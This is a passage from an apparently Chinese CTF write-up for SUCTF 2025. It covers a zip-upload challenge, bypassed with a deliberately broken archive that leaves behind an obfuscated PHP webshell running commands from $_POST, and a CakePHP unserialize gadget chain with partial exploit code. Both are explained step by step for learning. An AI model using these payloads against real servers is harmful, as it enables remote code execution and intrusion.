</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$uploadDir</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>mkdir</span><span class=p>(</span><span class=nv>$uploadDir</span><span class=p>,</span> <span class=mo>0777</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;error&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nx>UPLOAD_ERR_OK</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$uploadedFile</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$zipname</span> <span class=o>=</span> <span class=nv>$uploadedFile</span><span class=p>[</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$path</span> <span class=o>=</span> <span class=nv>$uploadDir</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>unzip</span><span class=p>(</span><span class=nv>$zipname</span><span class=p>,</span> <span class=nv>$path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$result</span> <span class=o>===</span> <span class=k>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: index.html?status=success&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: index.html?status=</span><span class=si>$result</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: index.html?status=file_error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>先草草的看看代码发现并没有什么长度和大小的限制，因为是压缩包的上传，很正常但是正因为如此，这个waf就很好绕过去github上面找点免杀，就可以，看看代码首先就看到对图片的处理</p><p><img src=/p/suctf2025/QQ20250113-192646.jpg width=1409 height=1194 srcset="/p/suctf2025/QQ20250113-192646_hu_7b1740998775f867.jpg 480w, /p/suctf2025/QQ20250113-192646_hu_cc02e9b660eef7e8.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=118 data-flex-basis=283px></p><p>这个很显然过滤的很少，可以直接用<code>.htaccess</code>绕过，高兴的上线一看，没有上传图片的口子emm，然后是一个生成文件名的函数<code>file_rename</code>，移动文件的函数<code>move_file</code>，对文件过滤的waf<code>check_base</code>，对压缩包的<code>check_content</code>，然后就是解压函数了，其实就一个关键点，创建了一个<code>ZipArchive</code>，但是如果在解压的时候部分文件受损就会中途停止解压，成功遗留下webshell，并且知道木马的路径是<code>upload/suimages/</code></p><p><img src=/p/suctf2025/QQ20250113-193935.jpg width=1487 height=978 srcset="/p/suctf2025/QQ20250113-193935_hu_8df45132fb5e8924.jpg 480w, /p/suctf2025/QQ20250113-193935_hu_3af77c156ea2652d.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=152 data-flex-basis=364px></p><p>不过这里使用比较简单的方式，出题人的poc，老规矩，先看<code>phpinfo</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?=</span><span class=nx>phpinfo</span><span class=p>();</span><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><a class=link href=https://twe1v3.top/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/#%E6%96%87%E4%BB%B6%E5%90%8D%E6%8A%A5%E9%94%99 target=_blank rel=noopener>绕过</a>，按照里面的来制作zip包</p><p><img src=/p/suctf2025/QQ20250113-194309.jpg width=1846 height=1212 srcset="/p/suctf2025/QQ20250113-194309_hu_d314ca41f45b9023.jpg 480w, /p/suctf2025/QQ20250113-194309_hu_2bf0878faeb7a3b3.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=152 data-flex-basis=365px></p><p>结果一直做不好，换一种方法，超出限制</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zipfile</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>io</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mf</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>BytesIO</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>zipfile</span><span class=o>.</span><span class=n>ZipFile</span><span class=p>(</span><span class=n>mf</span><span class=p>,</span> <span class=n>mode</span><span class=o>=</span><span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=n>compression</span><span class=o>=</span><span class=n>zipfile</span><span class=o>.</span><span class=n>ZIP_STORED</span><span class=p>)</span> <span class=k>as</span> <span class=n>zf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>zf</span><span class=o>.</span><span class=n>writestr</span><span class=p>(</span><span class=s1>&#39;1.php&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&lt;?=`ls`;?&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>zf</span><span class=o>.</span><span class=n>writestr</span><span class=p>(</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>5000</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;AAAAA&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;shell.zip&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>mf</span><span class=o>.</span><span class=n>getvalue</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>结果上次成功了但是没有成功RCE，好像有disable，可以看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zipfile</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>io</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># PHP代码作为一个字符串</span>
</span></span><span class=line><span class=cl><span class=n>php_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;?php
</span></span></span><span class=line><span class=cl><span class=s2>$a = &#39;edoced_46esab&#39;;
</span></span></span><span class=line><span class=cl><span class=s2>$b = strrev($a);
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>$d = &#39;c3~@#@#@lz!@dGVt&#39;;
</span></span></span><span class=line><span class=cl><span class=s2>$s = $b($d);
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>echo $s;
</span></span></span><span class=line><span class=cl><span class=s2>$s($_POST[1]);
</span></span></span><span class=line><span class=cl><span class=s2>$e=&#39;php&#39;;
</span></span></span><span class=line><span class=cl><span class=s2>$f=&#39;in&#39;;
</span></span></span><span class=line><span class=cl><span class=s2>$w=&#39;fo&#39;;
</span></span></span><span class=line><span class=cl><span class=s2>$g=$e.$f.$w;
</span></span></span><span class=line><span class=cl><span class=s2>$g();
</span></span></span><span class=line><span class=cl><span class=s2>?&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mf</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>BytesIO</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>zipfile</span><span class=o>.</span><span class=n>ZipFile</span><span class=p>(</span><span class=n>mf</span><span class=p>,</span> <span class=n>mode</span><span class=o>=</span><span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=n>compression</span><span class=o>=</span><span class=n>zipfile</span><span class=o>.</span><span class=n>ZIP_STORED</span><span class=p>)</span> <span class=k>as</span> <span class=n>zf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 将phpinfo()替换为提供的PHP代码</span>
</span></span><span class=line><span class=cl>    <span class=n>zf</span><span class=o>.</span><span class=n>writestr</span><span class=p>(</span><span class=s1>&#39;1.php&#39;</span><span class=p>,</span> <span class=n>php_code</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>  <span class=c1># 确保将字符串编码为字节</span>
</span></span><span class=line><span class=cl>    <span class=n>zf</span><span class=o>.</span><span class=n>writestr</span><span class=p>(</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>5000</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;AAAAA&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;shell.zip&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>mf</span><span class=o>.</span><span class=n>getvalue</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/suctf2025/QQ20250113-202337.jpg width=1488 height=753 srcset="/p/suctf2025/QQ20250113-202337_hu_ecdc7227fc9e86ab.jpg 480w, /p/suctf2025/QQ20250113-202337_hu_ef85d27fa2a74cd5.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=197 data-flex-basis=474px></p><p>打通之后找到Nbc哥哥询问第一种方法哪里错了，原来是没改好，其实还是两个文件的，但是我看了那个文章之后就觉得不对了，因为每次上传上去之后都没有成功</p><p><img src=/p/suctf2025/QQ20250113-204103.jpg width=1904 height=1252 srcset="/p/suctf2025/QQ20250113-204103_hu_51dcabac48c0b24f.jpg 480w, /p/suctf2025/QQ20250113-204103_hu_be4c5c4812dcfc3a.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=152 data-flex-basis=364px></p><p><img src=/p/suctf2025/QQ20250113-204216.jpg width=1846 height=1226 srcset="/p/suctf2025/QQ20250113-204216_hu_6d61e6fe35ade3a9.jpg 480w, /p/suctf2025/QQ20250113-204216_hu_2db1a2f3f6a0e02.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=150 data-flex-basis=361px></p><p>但是在这里一不小心又踩了个坑，shell应该在前面而不是后面</p><p><img src=/p/suctf2025/QQ20250113-205035.jpg width=1794 height=1157 srcset="/p/suctf2025/QQ20250113-205035_hu_9e919a719383705a.jpg 480w, /p/suctf2025/QQ20250113-205035_hu_93b471d39afd69a1.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=155 data-flex-basis=372px></p><p>说实话这个压缩这里挺折磨人的</p><h2 id=su_pop>SU_POP</h2><p>先下载源码然后打开审一下，首先进来看到是压缩包<code>CakePHP</code>，网上找点文章看看先，进入代码之后先看路由</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>Cake\Routing\Route\DashedRoute</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>Cake\Routing\RouteBuilder</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=k>function</span> <span class=p>(</span><span class=nx>RouteBuilder</span> <span class=nv>$routes</span><span class=p>)</span><span class=o>:</span> <span class=nx>void</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$routes</span><span class=o>-&gt;</span><span class=na>setRouteClass</span><span class=p>(</span><span class=nx>DashedRoute</span><span class=o>::</span><span class=na>class</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$routes</span><span class=o>-&gt;</span><span class=na>scope</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=k>function</span> <span class=p>(</span><span class=nx>RouteBuilder</span> <span class=nv>$builder</span><span class=p>)</span><span class=o>:</span> <span class=nx>void</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$builder</span><span class=o>-&gt;</span><span class=na>connect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;controller&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Pages&#39;</span><span class=p>,</span> <span class=s1>&#39;action&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;display&#39;</span><span class=p>,</span> <span class=s1>&#39;home&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$builder</span><span class=o>-&gt;</span><span class=na>connect</span><span class=p>(</span><span class=s1>&#39;/pages/*&#39;</span><span class=p>,</span> <span class=s1>&#39;Pages::display&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$builder</span><span class=o>-&gt;</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;/ser&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;controller&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Pages&#39;</span><span class=p>,</span> <span class=s1>&#39;action&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;handleSer&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$builder</span><span class=o>-&gt;</span><span class=na>fallbacks</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>也就是<code>/ser</code>路由看起来是可利用的，还有<code>connect</code>看起来好像也可以，不过我们先进<code>handleSer</code>，全局搜索之后找到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>handleSer</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ser</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>request</span><span class=o>-&gt;</span><span class=na>getQuery</span><span class=p>(</span><span class=s1>&#39;ser&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>unserialize</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$ser</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>set</span><span class=p>(</span><span class=s1>&#39;ser&#39;</span><span class=p>,</span> <span class=nv>$ser</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>viewBuilder</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>setLayout</span><span class=p>(</span><span class=s1>&#39;ajax&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>render</span><span class=p>(</span><span class=s1>&#39;handle_ser&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>找到反序列化点，并且参数为<code>ser</code>，那么继续找反序列化入口，我们直接搜索<code>__destruct</code>，找肯定是要找有可能触发方法的，而不是直接断掉的，最后找到下图的方法</p><p><img src=/p/suctf2025/QQ20250114-151910.jpg width=1736 height=1056 srcset="/p/suctf2025/QQ20250114-151910_hu_a9a9d81c88ddf2a7.jpg 480w, /p/suctf2025/QQ20250114-151910_hu_e71391f3ca3a2e2e.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=164 data-flex-basis=394px></p><p>这里可以触发<code>__toString</code>，然后继续查找方法，要让<code>$handler</code>为NULL值才可以，跟进之后发现这个方法在我们使用的时候是恒返回NULL的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>set_rejection_handler</span><span class=p>(</span><span class=o>?</span><span class=nx>callable</span> <span class=nv>$callback</span><span class=p>)</span><span class=o>:</span> <span class=o>?</span><span class=nx>callable</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>static</span> <span class=nv>$current</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$previous</span> <span class=o>=</span> <span class=nv>$current</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$current</span> <span class=o>=</span> <span class=nv>$callback</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$previous</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>现在参数可控，我们找到合适的<code>__toString</code>即可，我捏吗是真难找啊，我找了好多个方法才看到</p><p><img src=/p/suctf2025/QQ20250114-155025.jpg width=1052 height=477 srcset="/p/suctf2025/QQ20250114-155025_hu_7c0ce399e685b0.jpg 480w, /p/suctf2025/QQ20250114-155025_hu_3f25e4c1e0c4ceac.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=220 data-flex-basis=529px></p><p>其中如果方法是不存在的即可访问<code>__call</code>也就是网上的那条链子了，不过现在要解决一个问题就是看看<code>$stream这个参数是否可控</code></p><p><img src=/p/suctf2025/QQ20250114-155654.jpg width=1593 height=1230 srcset="/p/suctf2025/QQ20250114-155654_hu_3e08bcd73a186ff3.jpg 480w, /p/suctf2025/QQ20250114-155654_hu_eb8506495b608904.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=129 data-flex-basis=310px></p><p>然后就到网上的那个<code>__call</code>方法去</p><p><img src=/p/suctf2025/QQ20250114-155745.jpg width=1534 height=650 srcset="/p/suctf2025/QQ20250114-155745_hu_b6aa233083d7f12f.jpg 480w, /p/suctf2025/QQ20250114-155745_hu_e5fe2a642d3ac5de.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=236 data-flex-basis=566px></p><p>然后找可以利用的<code>call</code>方法，</p><p><img src=/p/suctf2025/QQ20250114-160116.jpg width=1601 height=608 srcset="/p/suctf2025/QQ20250114-160116_hu_48a94148904180cc.jpg 480w, /p/suctf2025/QQ20250114-160116_hu_dc1aa73d984b6498.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=263 data-flex-basis=631px></p><p>这里已经是可以调用任意函数了，其中调用方法的是没有参数的方法，所以继续找再找可以RCE的方法比如<code>eval</code>什么的，phpstorm不好找，所以进notepad找，然后找到这个</p><p><img src=/p/suctf2025/QQ20250114-164650.jpg width=1599 height=228 srcset="/p/suctf2025/QQ20250114-164650_hu_cc9f9437b095b00d.jpg 480w, /p/suctf2025/QQ20250114-164650_hu_c09325186697b984.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=701 data-flex-basis=1683px></p><p>然后进入看那看是否无参，确实是</p><p><img src=/p/suctf2025/QQ20250114-164804.jpg width=1200 height=702 srcset="/p/suctf2025/QQ20250114-164804_hu_63089c35cded12d1.jpg 480w, /p/suctf2025/QQ20250114-164804_hu_3734b03e1b7b992d.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=170 data-flex-basis=410px></p><p>那么就对了，写出链子</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RejectedPromise::__destruct()-&gt;Response::__toString()-&gt;Table::__call()-&gt;BehaviorRegistry::call()-&gt;MockClass::-&gt;generate()
</span></span></code></pre></td></tr></table></div></div><p>依次触发写出<code>exp</code>，这里简单提一嘴命名空间这个概念，因为我之前tp也没自己写过，其实就是<code>namespace</code>和<code>use</code>，这二者的区别就是</p><blockquote><p>namespace用来写起始位置，use写触发位置</p></blockquote><p>可能还是没看懂，但是你把poc配合起来看肯定能看懂的</p><p><img src=/p/suctf2025/QQ20250114-174041.jpg width=1272 height=1266 srcset="/p/suctf2025/QQ20250114-174041_hu_fa0a5ce0fb3024b1.jpg 480w, /p/suctf2025/QQ20250114-174041_hu_37d53cbb49df178.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=100 data-flex-basis=241px></p><p>当我写到这里的时候我卡住了，为啥呢，因为是真不知道怎么写了，后面一看，这两个东西都在<code>Cake\ORM</code>下面不需要用use了，然后在<code>call</code>方法的时候又卡了，不知道怎么写参数，跟进这个检查方法的看</p><p><img src=/p/suctf2025/QQ20250114-174929.jpg width=1050 height=319 srcset="/p/suctf2025/QQ20250114-174929_hu_fbf9ba297f4c9da0.jpg 480w, /p/suctf2025/QQ20250114-174929_hu_c10a2c4f975df1e3.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=329 data-flex-basis=789px></p><p>看来是检查方法是否存在于<code>_methodMap</code>这个数组里面</p><p><img src=/p/suctf2025/QQ20250114-175105.jpg width=815 height=241 srcset="/p/suctf2025/QQ20250114-175105_hu_2e6436c3b4fdb25d.jpg 480w, /p/suctf2025/QQ20250114-175105_hu_765a086d717269b.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=338 data-flex-basis=811px></p><p>这也是一样的检查是不是在<code>_loader</code>里面，也就是在这两个数组里面写类和调用的方法即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>React\Promise\Internal</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>Cake\Http\Response</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>final</span> <span class=k>class</span> <span class=nc>RejectedPromise</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$reason</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$handled</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>reason</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Response</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Cake\Http</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>Cake\ORM\Table</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Response</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$stream</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>stream</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Table</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Cake\ORM</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>PHPUnit\Framework\MockObject\Generator\MockClass</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Table</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nx>BehaviorRegistry</span> <span class=nv>$_behaviors</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
